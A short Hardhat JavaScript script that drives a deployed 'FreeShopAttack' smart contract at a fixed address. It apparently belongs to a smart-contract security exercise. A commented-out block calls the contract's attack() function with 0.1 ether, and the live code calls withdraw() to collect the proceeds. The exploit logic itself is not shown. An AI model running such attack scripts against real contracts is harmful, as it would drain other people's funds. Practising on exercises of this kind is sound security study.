// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");

async function main() {
  // Hardhat always runs the compile task when running scripts with its command
  // line interface.
  //
  // If this script is run directly using `node` you may want to call compile
  // manually to make sure everything is compiled
  // await hre.run('compile');

  // attack
  const [signer] = await hre.ethers.getSigners();
  const freeShopAttack = await ethers.getContractAt(
    require('../artifacts/contracts/FreeshopAttack.sol/FreeShopAttack.json').abi,
    '0x3314342C8569ceBf327c7D2Bb4b97A8d384BD46F',
    signer
  );

  // const txRes = await freeShopAttack.attack({
  //   value: ethers.utils.parseEther('0.1'),
  //   gasLimit: 2000000
  // });
  // const rc = await txRes.wait();
  // console.log('attack tx hash: ', rc.transactionHash);

  // console.log('contract balance: ', (await signer.provider.getBalance('0x3314342C8569ceBf327c7D2Bb4b97A8d384BD46F')).toString());

  const txRes = await freeShopAttack.connect(signer).withdraw();
  const rc = await txRes.wait();
  console.log('withdraw tx hash: ', rc.transactionHash);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
